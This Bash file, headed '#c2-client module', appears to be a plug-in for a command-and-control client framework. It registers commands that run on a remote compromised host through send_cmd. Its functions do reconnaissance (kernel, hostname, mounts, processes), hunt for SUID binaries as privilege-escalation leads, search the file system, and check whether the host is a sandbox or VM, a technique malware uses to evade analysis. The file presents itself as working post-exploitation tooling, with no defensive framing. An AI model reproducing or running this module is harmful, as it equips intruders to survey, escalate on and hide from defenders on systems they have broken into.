#!/usr/bin/env bash
#c2-client module
#YbBKCESADB
#System tools module

source funcmgr.sh

print_warn() {
  echo -e "${YELLOW}[!]${NC} $1" >&2
}

print_err() {
  echo -e "${RED}[!]${NC} $1" >&2
}

print_std() {
  echo -e "${GREEN}[+]${NC} $1"
}

print_help() {
  echo -e "${BLUE}$1${NC} $2"
}

print_out() {
  echo -e "${GREEN}[+]${YELLOW} $1${NC}"
}

print_dbg() {
   if [[ "${DEBUG}" == "1" ]]; then
     local ts
     ts=$(date +"%Y-%m-%d %H:%M:%S")
     echo "[$ts] $1" >> "$DEBUG_LOG_FILE"
   fi
}

# Main function for system tools module
YbBKCESADB_main() {
  :
}

# Initialize system tools module and register functions
YbBKCESADB_init() {
  register_function "explore" "explore" 0 "Target system basic info"
  register_function 'suid' "find_suid" 0 "Find SUID binaries"
  register_function "search" "find_files" 2 "Find files by regex"
  register_function "detect_sandbox" "detect_sandbox" 0 "Detect and determine sandbox type"
}

# Module description
YbBKCESADB_description() {
  echo "System tools module"
}

# Help function showing available commands and usage
YbBKCESADB_help() {
  print_help "explore" "show basic system info"
  print_help "suid" "find SUID binaries"
  print_help "search" "search for files. Usage: search <regex> <dir>"
  print_help "detect_sandbox" "detect and determine sandbox type"
}

# Explore function - gathers basic system information
explore() {
  print_out "System reconnaissance${NC}:"

  # Helper function for printing multiline remote output with indentation
  _print_block() {
    local title="$1"
    local data="$2"
    print_out "${title}:${NC}"
    if [[ -z "$data" ]]; then
      print_err "(no output)${NC}"
    else
      # Prefix each line with 4 spaces for readability
      while IFS= read -r _line; do
        printf '    %s\n' "$_line"
      done <<<"$data"
    fi
    echo
  }

  local out

  # Get kernel and OS information
  out=$(send_cmd "uname -a" 2>/dev/null || true)
  _print_block "Kernel / OS" "$out"

  # Get system issue information
  out=$(send_cmd "cat /etc/issue 2>/dev/null || true" 2>/dev/null || true)
  _print_block "/etc/issue" "$out"

  # Get hostname
  out=$(send_cmd "hostname 2>/dev/null || true" 2>/dev/null || true)
  _print_block "Hostname" "$out"

  # Get mounted filesystems (first 40 lines)
  out=$(send_cmd "mount | sed -n '1,40p' 2>/dev/null || true" 2>/dev/null || true)
  _print_block "Mounts (first 40 lines)" "$out"

  # Get top processes by memory usage
  out=$(send_cmd "ps aux --sort=-%mem 2>/dev/null | head -n 15 || true" 2>/dev/null || true)
  _print_block "Top processes (by memory)" "$out"
}

# Detect sandbox or virtualized environment
detect_sandbox() {
  print_out "Checking for sandbox or VM environment on remote system..."
  local DETECTED=0

  # 1. Docker / LXC / Kubernetes detection via cgroup
  if send_cmd "grep -qE 'docker|lxc|kubepods' /proc/1/cgroup && echo yes || echo no" | grep -q yes; then
    print_out "Detected containerized environment (Docker/LXC/Kubernetes)"
    DETECTED=1
  fi

  # 2. Bubblewrap detection via mount
  if send_cmd "mount | grep -q '/bubblewrap' && echo yes || echo no" | grep -q yes; then
    print_out "Detected Bubblewrap sandbox"
    DETECTED=1
  fi

  # 3. VM detection via DMI product name
  local PN
  PN=$(send_cmd "cat /sys/class/dmi/id/product_name 2>/dev/null || echo unknown")
  case "$PN" in
    *VirtualBox*)
      print_out "Detected VirtualBox VM"
      DETECTED=1
      ;;
    *VMware*)
      print_out "Detected VMware VM"
      DETECTED=1
      ;;
    *KVM*)
      print_out "Detected KVM/QEMU VM"
      DETECTED=1
      ;;
    *Bochs*)
      print_out "Detected Bochs VM"
      DETECTED=1
      ;;
    *Microsoft*Virtual*)
      print_out "Detected Hyper-V VM"
      DETECTED=1
      ;;
  esac

  # 4. Hypervisor flag in CPU info
  if send_cmd "grep -q 'hypervisor' /proc/cpuinfo && echo yes || echo no" | grep -q yes; then
    print_out "Hypervisor flag detected in CPU info"
    DETECTED=1
  fi

  # 5. systemd-nspawn container check
  if send_cmd "grep -q 'systemd-nspawn' /proc/1/cmdline && echo yes || echo no" | grep -q yes; then
    print_out "Detected systemd-nspawn container"
    DETECTED=1
  fi

  # 6. Container-specific devices
  if send_cmd "[ -d /dev/.lxc ] && echo yes || [ -d /dev/.dockerinit ] && echo yes || echo no" | grep -q yes; then
    print_out "etected container-specific devices (/dev/.lxc or /dev/.dockerinit)${NC}"
    DETECTED=1
  fi

  # Final detection result
  if [[ "$DETECTED" -eq 0 ]]; then
    print_out "No sandbox or VM detected on remote system."
  fi
}

# Find files by pattern using find command
find_files() {
  local PATTERN="$1"
  local DIR="${2:-/}"
  print_out "Finding files: $PATTERN in $DIR${NC}"
  send_cmd "find $DIR -name '$PATTERN' -type f 2>/dev/null"
}

# Find SUID binaries on the system
find_suid() {
  print_out "Finding suid binaries..."
  send_cmd "find / -perm /4000 2>/dev/null"
}
